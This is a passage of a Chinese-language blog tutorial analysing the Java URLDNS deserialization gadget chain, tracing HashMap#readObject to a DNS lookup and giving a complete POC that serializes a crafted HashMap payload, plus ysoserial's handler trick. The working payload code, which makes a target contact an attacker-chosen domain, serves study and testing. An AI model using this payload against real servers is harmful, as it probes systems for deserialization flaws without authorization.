+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (hashCode <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> hashCode;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        hashCode <span style="color:#f92672">=</span> handler.<span style="color:#a6e22e">hashCode</span>(<span style="color:#66d9ef">this</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> hashCode;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>在URL类的hashCode方法中，又调用了URLStreamHandler#hashCode，并将自身传递进去：</p>
+<p>URLStreamHandler#hashCode</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>(URL u) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> h <span style="color:#f92672">=</span> 0;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Generate the protocol part.</span>
+</span></span><span style="display:flex;"><span>        String protocol <span style="color:#f92672">=</span> u.<span style="color:#a6e22e">getProtocol</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (protocol <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>)
+</span></span><span style="display:flex;"><span>            h <span style="color:#f92672">+=</span> protocol.<span style="color:#a6e22e">hashCode</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Generate the host part.</span>
+</span></span><span style="display:flex;"><span>        InetAddress addr <span style="color:#f92672">=</span> getHostAddress(u);
+</span></span></code></pre></div><p>getHostAddress，正是这步触发了dns请求：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">synchronized</span> InetAddress <span style="color:#a6e22e">getHostAddress</span>(URL u) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (u.<span style="color:#a6e22e">hostAddress</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> u.<span style="color:#a6e22e">hostAddress</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    String host <span style="color:#f92672">=</span> u.<span style="color:#a6e22e">getHost</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (host <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">||</span> host.<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;&#34;</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            u.<span style="color:#a6e22e">hostAddress</span> <span style="color:#f92672">=</span> InetAddress.<span style="color:#a6e22e">getByName</span>(host);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (UnknownHostException ex) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (SecurityException se) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> u.<span style="color:#a6e22e">hostAddress</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这⾥ InetAddress.getByName(host) 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次 DNS查询。</p>
+<p>可以理解为,在序列化 HashMap 类的对象时, 为了减小序列化后的大小, 并没有将整个哈希表保存进去, 而是仅仅保存了所有内部存储的 key 和 value. 所以在反序列化时, 需要重新计算所有 key 的 hash, 然后与 value 一起放入哈希表中. 而恰好, URL这个对象计算 hash 的过程中用了 getHostAddress 查询了 URL 的主机地址, 自然需要发出 DNS 请求.</p>
+<p>这里存在一个问题,当我们生成payload的时候,也会存在计算哈希的过程,我们需要避免这个操作,</p>
+<p>回到第一步：HashMap#readObject</p>
+<p>key是使用readObject取出来的，也就是说在writeObject一定会写入key</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">writeObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectOutputStream</span> s)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> buckets <span style="color:#f92672">=</span> capacity();
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Write out the threshold, loadfactor, and any hidden stuff</span>
+</span></span><span style="display:flex;"><span>        s.<span style="color:#a6e22e">defaultWriteObject</span>();
+</span></span><span style="display:flex;"><span>        s.<span style="color:#a6e22e">writeInt</span>(buckets);
+</span></span><span style="display:flex;"><span>        s.<span style="color:#a6e22e">writeInt</span>(size);
+</span></span><span style="display:flex;"><span>        internalWriteEntries(s);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>跟入internalWriteEntries</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">internalWriteEntries</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectOutputStream</span> s) <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>        Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;[]</span> tab;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&gt;</span> 0 <span style="color:#f92672">&amp;&amp;</span> (tab <span style="color:#f92672">=</span> table) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> tab.<span style="color:#a6e22e">length</span>; <span style="color:#f92672">++</span>i) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;</span> e <span style="color:#f92672">=</span> tab<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>; e <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>; e <span style="color:#f92672">=</span> e.<span style="color:#a6e22e">next</span>) {
+</span></span><span style="display:flex;"><span>                    s.<span style="color:#a6e22e">writeObject</span>(e.<span style="color:#a6e22e">key</span>);
+</span></span><span style="display:flex;"><span>                    s.<span style="color:#a6e22e">writeObject</span>(e.<span style="color:#a6e22e">value</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>这里的key以及value是从tab中取的，而tab的值即HashMap中table的值。</p>
+<p>此时我们如果想要修改table的值，就需要调用HashMap#put方法，而HashMap#put方法中也会对key调用一次hash方法，所以在这里就会产生第一次dns查询</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> V <span style="color:#a6e22e">put</span>(K key, V value) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> putVal(hash(key), key, value, <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>即</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.URL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        HashMap map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        URL url <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;http://xrgsnqezso.yutu.eu.org&#34;</span>);
+</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(url,123); <span style="color:#75715e">//此时会产生dns查询</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>只想判断payload在对方机器上是否成功触发，那就应该避免掉这一次dns查询以及多余的操作，回到URL#hashCode：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>() {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (hashCode <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1)
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> hashCode;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      hashCode <span style="color:#f92672">=</span> handler.<span style="color:#a6e22e">hashCode</span>(<span style="color:#66d9ef">this</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> hashCode;
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>这里会先判断hashCode是否为-1，如果不为-1则直接返回hashCode，也就是说我们只要在put前修改URL的hashCode为其他任意值，就可以在put时不触发dns查询。(hashCode默认值为-1)
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-urldns%e9%93%be_image_1.png" alt="" /></figure>
+
+
+
+这里的hashCode是private修饰的，所以我们需要通过反射来修改其值</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        HashMap map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        URL url <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;http://xrgsnqezso.yutu.eu.org&#34;</span>);
+</span></span><span style="display:flex;"><span>        Field f <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.net.URL&#34;</span>).<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;hashCode&#34;</span>);
+</span></span><span style="display:flex;"><span>        f.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>); <span style="color:#75715e">//修改访问权限</span>
+</span></span><span style="display:flex;"><span>        f.<span style="color:#a6e22e">set</span>(url,123); <span style="color:#75715e">//设置hashCode值为123，这里可以是任何不为-1的数字</span>
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(url.<span style="color:#a6e22e">hashCode</span>()); <span style="color:#75715e">// 获取hashCode的值，验证是否修改成功</span>
+</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(url,123); <span style="color:#75715e">//调用map.put 此时将不会再触发dns查询</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>此时输出url的hashCode为123，证明修改成功。
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-urldns%e9%93%be_image_2.png" alt="" /></figure>
+
+
+
+当put完毕之后再将url的hashCode修改为-1，确保在反序列化调用hashCode方法时能够正常进行，下面是完整的POC</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>URLDNS.<span style="color:#a6e22e">java</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.FileOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.URL;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">URLDNS</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>URL, String<span style="color:#f92672">&gt;</span> hashMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;</span>URL, String<span style="color:#f92672">&gt;</span>();
+</span></span><span style="display:flex;"><span>        URL url <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;http://xxxx.xxx.xxx&#34;</span>);
+</span></span><span style="display:flex;"><span>        Field f <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.net.URL&#34;</span>).<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;hashCode&#34;</span>);
+</span></span><span style="display:flex;"><span>        f.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        f.<span style="color:#a6e22e">set</span>(url, 0xdeadbeef); <span style="color:#75715e">// 设一个值, 这样 put 的时候就不会去查询 DNS</span>
+</span></span><span style="display:flex;"><span>        hashMap.<span style="color:#a6e22e">put</span>(url, <span style="color:#e6db74">&#34;rmb122&#34;</span>);
+</span></span><span style="display:flex;"><span>        f.<span style="color:#a6e22e">set</span>(url, <span style="color:#f92672">-</span>1); <span style="color:#75715e">// hashCode 这个属性不是 transient 的, 所以放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode</span>
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(<span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">&#34;out.bin&#34;</span>));
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(hashMap);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>Test.<span style="color:#a6e22e">java</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.FileInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(<span style="color:#66d9ef">new</span> FileInputStream(<span style="color:#e6db74">&#34;out.bin&#34;</span>));
+</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>回过头来看看yso的payload</p>
+<p>yso在创建URL对象时使用了三个参数的构造方法。yso用了子类继承父类的方式规避了dns查询的风险，其创建了一个内部类：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SilentURLStreamHandler</span> <span style="color:#66d9ef">extends</span> URLStreamHandler {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> URLConnection <span style="color:#a6e22e">openConnection</span>(URL u) <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">synchronized</span> InetAddress <span style="color:#a6e22e">getHostAddress</span>(URL u) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>定义了一个URLConnection和getHostAddress方法，当调用put方法走到getHostAddress方法后，会调用SilentURLStreamHandler的getHostAddress而非URLStreamHandler的getHostAddress，这里直接return null了，所以自然也就不会产生dns查询。</p>
+<h2 id="参考">参考</h2>
+<p><a href="https://d0gekong.github.io/2022/07/13/Java/UrlDNS/" target="_blank" rel="noopener nofollow noreferrer" >urldns | Hack the world</a></p>
+<p><a href="https://xz.aliyun.com/t/13060" target="_blank" rel="noopener nofollow noreferrer" >xz.aliyun.com/t/13060</a></p>
 ]]></content>
             
                  
